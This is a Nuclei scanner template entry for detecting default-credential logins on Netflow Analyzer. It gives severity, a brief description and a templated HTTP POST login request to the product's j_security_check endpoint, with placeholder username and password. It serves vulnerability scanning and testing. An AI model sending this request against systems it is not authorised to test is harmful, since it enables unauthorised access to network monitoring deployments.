# Nuclei Template: Netflow Analyzer - Default Login
**Template ID:** netflow-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`netflow-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Netflow Analyzer default login was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /netflow/jspui/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

radiusUserEnabled=false&AUTHRULE_NAME=Authenticator&j_username={{username}}&j_password={{password}}&Submit=Login
```

